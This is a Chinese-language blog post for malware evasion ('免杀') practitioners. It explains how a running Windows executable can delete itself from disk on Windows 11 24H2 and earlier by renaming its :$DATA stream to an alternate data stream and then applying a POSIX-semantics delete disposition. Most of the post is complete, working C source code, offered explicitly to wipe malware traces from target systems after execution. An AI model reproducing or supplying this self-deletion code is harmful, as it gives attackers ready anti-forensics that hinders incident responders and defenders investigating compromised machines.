当一个二进制程序运行时，那么通过常规手段将无法从磁盘中删除此文件，在免杀对抗中这违背了opsec的原则，那么我们需要一种清除痕迹的手段在程序已经在内存运行后从磁盘中删除，解决这个问题的一种方法是重命名默认数据流 `:$DATA` 更改为代表新数据流的另一个随机名称。之后， 删除新重命名的数据流将导致二进制文件 从磁盘中删除，即使它仍在运行。


在 Windows [23H2](https://cybersecuritynews.com/windows-11-security-update-lead-to-recovery-error/) 及更早版本下，该方法运行完美：首先打开一个具有 DELETE 访问权限的文件，重命名主数据流，关闭句柄，重新打开文件，将删除处置设置为 true，最后关闭句柄以触发删除。此过程有效地从目标系统存储中清除了恶意软件的所有痕迹，但是在24h2版本的windows当中这种方法就会失效。



在 Windows 中，程序启动时，系统会通过 **内存映射文件（Memory Mapped File）** 将 EXE 文件加载到内存中。

- 当程序运行后，它使用的是**内存中的副本**，而不是直接执行磁盘文件。
    
- 这意味着，只要不再访问磁盘文件本身，理论上你可以删除磁盘上的原始文件而不会影响正在运行的进程。
    

在 Windows 10 及更早版本，这种删除是直接彻底删除的。  
在 **Windows 11 24H2**，NTFS 新加了保护机制，普通 `SetFileInformationByHandle` 会失败，所以必须使用你代码中实现的 **POSIX 语义删除**：

### **总体流程**

1. **获取当前进程的 EXE 文件路径**  
    使用 `GetModuleFileNameW` 获取当前运行程序的完整路径。
    
2. **打开当前文件句柄**  
    使用 `CreateFileW` 以 `DELETE` 权限打开。
    
3. **将默认数据流 `:$DATA` 重命名为自定义 ADS（Alternate Data Stream）**  
    通过 `SetFileInformationByHandle(FileRenameInfo)` 重命名为 `:$delete` 之类的流。
    
4. **关闭第一个句柄，重新以 `DELETE` 权限打开文件**  
    这是为了确保后续删除操作生效。
    
5. **设置 POSIX 删除标记**  
    使用 `SetFileInformationByHandle(FileDispositionInfoEx)`，并设置标记：
    
    `FILE_DISPOSITION_FLAG_DELETE | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS`
    
6. **关闭句柄触发删除**  
    当句柄关闭时，文件被标记删除，但进程仍然继续在内存中运行。
    
7. **验证文件是否已删除**  
    调用 `PathFileExistsW` 检查路径是否还存在。


代码如下：
```C
#include<Windows.h>
#include<stdio.h>
#include<stdlib.h>

BOOL FileExists(LPCWSTR path) {
	DWORD attr = GetFileAttributesW(path);
	return (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY));
}

BOOL SeleDelete() {
	HANDLE hFile = INVALID_HANDLE_VALUE;
	WCHAR Path[MAX_PATH * 2];
	//获得当前文件路径
	if (!GetModuleFileNameW(NULL, Path, MAX_PATH * 2)) {
		printf("GetModuleFileNameW Failed with Error :%d\n", GetLastError());
		return FALSE;
	}
	//以DELETE标志创建文件句柄
	if ((hFile = CreateFileW(Path, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("CreateFileW Failed with Error :%d\n", GetLastError());
		return FALSE;
	}
	//重命名文件流名称
	LPCWSTR lpwStream = L":ajie";
	PFILE_RENAME_INFO pRename = (PFILE_RENAME_INFO)malloc(sizeof(FILE_RENAME_INFO) + sizeof(WCHAR) * wcslen(lpwStream));
	if (pRename == NULL) {
		printf("malloc Failed with Error :%d\n", GetLastError());
		return FALSE;
	}
	//填充PFILE_RENAME_INFO结构体
	RtlSecureZeroMemory(pRename, sizeof(FILE_RENAME_INFO) + sizeof(WCHAR) * wcslen(lpwStream));

	pRename->FileNameLength = (DWORD)(sizeof(WCHAR) * wcslen(lpwStream));

	RtlCopyMemory(pRename->FileName, lpwStream, sizeof(WCHAR) * (wcslen(lpwStream) + 1));
	//设置重命名文件流
	if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sizeof(FILE_RENAME_INFO) + sizeof(WCHAR) * wcslen(lpwStream))) {
		printf("SetFileInformationByHandle Failed with Error :%d\n", GetLastError());
		return FALSE;
	}
	//关闭文件句柄这是为了确保后续删除操作生效
	CloseHandle(hFile);
	free(pRename);
	pRename = NULL;
	//重新打开文件句柄（DELETE）
	hFile = CreateFileW(Path, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("CreateFileW2 Failed with Error :%d\n", GetLastError());
		return FALSE;
	}
	//设置 POSIX 删除标记
	FILE_DISPOSITION_INFO_EX fDeleteEx;
	RtlSecureZeroMemory(&fDeleteEx, sizeof(fDeleteEx));
	fDeleteEx.Flags = FILE_DISPOSITION_FLAG_DELETE | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS;

	if (!SetFileInformationByHandle(hFile, FileDispositionInfoEx, &fDeleteEx, sizeof(fDeleteEx))) {
		printf("failed to set delete deposition\n");
		return FALSE;
	}
	CloseHandle(hFile); //关闭句柄触发删除
	if (FileExists(Path)) {
		printf("failed to delete copy, file still exists\n");
		return FALSE;
	}
	return TRUE;
}

int main() {
	if (!SeleDelete()) {
		printf("SelfDelete Failed\n");
		return 1;
	} {
		printf("SelfDelete Successfully\n");
		getchar();
	}
	
	return 0;
}

```